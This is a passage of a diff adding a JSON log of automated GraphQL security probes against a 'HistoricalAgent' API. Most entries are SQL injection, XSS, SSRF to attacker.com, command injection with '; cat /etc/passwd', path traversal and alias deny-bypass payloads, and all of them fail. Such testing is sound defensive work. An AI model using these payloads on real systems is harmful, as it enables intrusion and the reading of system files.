+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.086,
+    "timestamp": "2025-09-29T07:47:16.398792Z",
+    "count": 43,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[HistoricalAgent]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/types]) : Field 'types' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-789\") {\n    id\n    typ\n    desription {\n      nam\n    }\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.085,
+    "timestamp": "2025-09-29T07:47:18.982693Z",
+    "count": 44,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/typ]) : Field 'typ' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/desription]) : Field 'desription' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.087,
+    "timestamp": "2025-09-29T07:47:36.534818Z",
+    "count": 45,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-456' OR '1'='1\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.086,
+    "timestamp": "2025-09-29T07:47:39.066579Z",
+    "count": 46,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-789\") {\n    id\n    description {\n      name\n      biographicalHistory\n      functions\n      mandates\n      scripts\n      sources\n    }\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.083,
+    "timestamp": "2025-09-29T07:47:40.714806Z",
+    "count": 47,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-101\") {\n    id\n    links {\n      id\n      type\n      linkType\n    }\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.091,
+    "timestamp": "2025-09-29T07:47:43.736087Z",
+    "count": 48,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-202\") {\n    id\n    annotations {\n      id\n      type\n      body\n    }\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.085,
+    "timestamp": "2025-09-29T07:47:46.531914Z",
+    "count": 49,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-303/../../etc/passwd\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.087,
+    "timestamp": "2025-09-29T07:47:48.587547Z",
+    "count": 50,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-404\") {\n    id\n    description {\n      name\n      biographicalHistory\n    }\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.083,
+    "timestamp": "2025-09-29T07:47:51.557176Z",
+    "count": 51,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-505\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.101,
+        "timestamp": "2025-09-29T07:47:53.881070Z",
+        "response_body": {
+          "data": {
+            "HistoricalAgent": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.086,
+        "timestamp": "2025-09-29T07:47:53.967799Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Invalid Syntax : offending token ':' at line 2 column 8",
+              "locations": [
+                {
+                  "line": 2,
+                  "column": 8
+                }
+              ],
+              "extensions": {
+                "classification": "InvalidSyntax"
+              }
+            }
+          ]
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 52,
+    "timestamp": "2025-09-29T07:47:53.967838Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.083,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery s: HistoricalAgent(id: \"agent-505\") {\n  HistoricalAgent\n  type\n  identifier\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.082,
+        "timestamp": "2025-09-29T07:47:55.656293Z",
+        "response_body": {
+          "data": {
+            "HistoricalAgent": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.088,
+        "timestamp": "2025-09-29T07:47:55.744863Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Invalid Syntax : offending token ':' at line 2 column 8",
+              "locations": [
+                {
+                  "line": 2,
+                  "column": 8
+                }
+              ],
+              "extensions": {
+                "classification": "InvalidSyntax"
+              }
+            }
+          ]
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 53,
+    "timestamp": "2025-09-29T07:47:55.744909Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.093,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.089,
+    "timestamp": "2025-09-29T07:47:57.995822Z",
+    "count": 54,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[HistoricalAgent]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/types]) : Field 'types' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-606\") {\n    id\n    typ\n    identifire\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.101,
+    "timestamp": "2025-09-29T07:47:59.927704Z",
+    "count": 55,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/typ]) : Field 'typ' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/identifire]) : Field 'identifire' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.08,
+    "timestamp": "2025-09-29T07:48:20.841042Z",
+    "count": 56,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/name]) : Field 'name' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123' OR '1'='1\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.081,
+    "timestamp": "2025-09-29T07:48:23.452936Z",
+    "count": 57,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/name]) : Field 'name' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123<script>alert('xss')</script>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.081,
+    "timestamp": "2025-09-29T07:48:26.446470Z",
+    "count": 58,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/name]) : Field 'name' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"http://attacker.com/evilhook\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.078,
+    "timestamp": "2025-09-29T07:48:29.288916Z",
+    "count": 59,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/name]) : Field 'name' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123; cat /etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.079,
+    "timestamp": "2025-09-29T07:48:31.268657Z",
+    "count": 60,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/name]) : Field 'name' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"../../../etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.094,
+    "timestamp": "2025-09-29T07:48:34.271813Z",
+    "count": 61,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/name]) : Field 'name' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123<h1>Hello Admin</h1>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.091,
+    "timestamp": "2025-09-29T07:48:36.990161Z",
+    "count": 62,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/name]) : Field 'name' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-non-aliased\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.083,
+        "timestamp": "2025-09-29T07:48:38.801841Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Validation error (FieldUndefined@[HistoricalAgent/name]) : Field 'name' in type 'HistoricalAgent' is undefined",
+              "locations": [
+                {
+                  "line": 5,
+                  "column": 5
+                }
+              ],
+              "extensions": {
+                "classification": "ValidationError"
+              }
+            }
+          ]
+        }
+      },
+      "aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.094,
+        "timestamp": "2025-09-29T07:48:38.897046Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Validation error (FieldUndefined@[HistoricalAgent/name]) : Field 'name' in type 'HistoricalAgent' is undefined",
+              "locations": [
+                {
+                  "line": 5,
+                  "column": 5
+                }
+              ],
+              "extensions": {
+                "classification": "ValidationError"
+              }
+            }
+          ]
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 63,
+    "timestamp": "2025-09-29T07:48:38.897141Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.102,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery BypassedQuery {\n  HistoricalAgentAlias: HistoricalAgent(id: \"agent-aliased\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.079,
+        "timestamp": "2025-09-29T07:48:40.929986Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Validation error (FieldUndefined@[HistoricalAgent/name]) : Field 'name' in type 'HistoricalAgent' is undefined",
+              "locations": [
+                {
+                  "line": 5,
+                  "column": 5
+                }
+              ],
+              "extensions": {
+                "classification": "ValidationError"
+              }
+            }
+          ]
+        }
+      },
+      "aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.095,
+        "timestamp": "2025-09-29T07:48:41.025726Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Validation error (FieldUndefined@[HistoricalAgent/name]) : Field 'name' in type 'HistoricalAgent' is undefined",
+              "locations": [
+                {
+                  "line": 5,
+                  "column": 5
+                }
+              ],
+              "extensions": {
+                "classification": "ValidationError"
+              }
+            }
+          ]
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 64,
+    "timestamp": "2025-09-29T07:48:41.025792Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.086,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.083,
+    "timestamp": "2025-09-29T07:48:44.168276Z",
+    "count": 65,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[HistoricalAgent]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/types]) : Field 'types' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-789\") {\n    id\n    nme\n    descrip\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.098,
+    "timestamp": "2025-09-29T07:48:46.494116Z",
+    "count": 66,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/nme]) : Field 'nme' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/descrip]) : Field 'descrip' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.099,
+    "timestamp": "2025-09-29T07:49:04.285688Z",
+    "count": 67,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123' OR '1'='1\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.086,
+    "timestamp": "2025-09-29T07:49:07.351449Z",
+    "count": 68,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123<script>alert('xss')</script>\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.08,
+    "timestamp": "2025-09-29T07:49:09.450504Z",
+    "count": 69,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"http://attacker.com/evilhook\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.085,
+    "timestamp": "2025-09-29T07:49:11.069663Z",
+    "count": 70,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123; cat /etc/passwd\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.093,
+    "timestamp": "2025-09-29T07:49:13.687594Z",
+    "count": 71,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"../../../etc/passwd\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.089,
+    "timestamp": "2025-09-29T07:49:16.128578Z",
+    "count": 72,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123<h1>Hello Admin</h1>\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.094,
+    "timestamp": "2025-09-29T07:49:17.757401Z",
+    "count": 73,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-bypass-1\") {\n    id\n    type\n    description {\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.071,
+        "timestamp": "2025-09-29T07:49:19.642730Z",
+        "response_body": {
+          "data": {
+            "HistoricalAgent": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.084,
+        "timestamp": "2025-09-29T07:49:19.727291Z",
+        "response_body": {
+          "data": {
+            "agentAlias": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 74,
+    "timestamp": "2025-09-29T07:49:19.727318Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.085,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  agentAlias: HistoricalAgent(id: \"agent-bypass-1\") {\n    id\n    type\n    description {\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.097,
+        "timestamp": "2025-09-29T07:49:22.468848Z",
+        "response_body": {
+          "data": {
+            "HistoricalAgent": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.08,
+        "timestamp": "2025-09-29T07:49:22.549178Z",
+        "response_body": {
+          "data": {
+            "agentAlias": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 75,
+    "timestamp": "2025-09-29T07:49:22.549285Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.08,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.082,
+    "timestamp": "2025-09-29T07:49:24.530552Z",
+    "count": 76,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[HistoricalAgent]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/types]) : Field 'types' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-789\") {\n    id\n    typ\n    descript\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.088,
+    "timestamp": "2025-09-29T07:49:26.614689Z",
+    "count": 77,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/typ]) : Field 'typ' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[HistoricalAgent/descript]) : Field 'descript' in type 'HistoricalAgent' is undefined",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123\") {\n    id\n    type\n    identifier\n    description {\n      name\n      languageCode\n    }\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.088,
+    "timestamp": "2025-09-29T07:49:46.598006Z",
+    "count": 78,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  HistoricalAgent(id: \"agent-123' OR '1'='1\") {\n    id\n    type\n    identifier\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.087,
+    "timestamp": "2025-09-29T07:49:49.442608Z",
+    "count": 79,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "HistoricalAgent": null
+      }
+    },
